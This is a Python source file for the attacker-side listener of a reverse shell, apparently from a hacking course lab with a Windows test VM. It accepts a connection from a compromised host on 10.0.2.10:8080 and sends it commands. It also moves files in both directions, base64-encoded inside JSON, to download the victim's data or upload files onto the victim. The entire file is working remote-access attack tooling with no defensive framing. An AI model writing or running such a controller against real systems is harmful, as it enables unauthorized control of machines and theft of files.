import socket
import simplejson
import base64

class SocketListener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)  # Use instance multiple times
        listener.bind((ip,port))
        listener.listen(0)
        print("Listening on port 8080...")

        (self.connection,address) = listener.accept()

        print("Listening established..." + str(address))

    #Sending Input
    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    # Process Input
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    # Getting Input
    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "exit":
            self.connection.close()
            exit()
        return self.json_receive()

    # Saving file
    def save_file(self,path,content):
        try:
            with open(path, "wb") as my_file:
                my_file.write(base64.b64decode(content))
                return "Downloaded successfully"
        except Exception:
            return "Error saving file"

    # Uploading file contents
    def get_file_contents(self,path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read()).decode()

    def start_listener(self):
        while True:
            command_input = input("Windows C:\\User\\IEUser\\> ")
            command_input = command_input.split(" ")

            try:
                if command_input[0] == "upload":
                    file_contents = self.get_file_contents(command_input[1])
                    command_input.append(file_contents)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

            except Exception:
                command_output = "Error!! Check command input."

            print(command_output)

socket_listener = SocketListener("10.0.2.10",8080)
socket_listener.start_listener()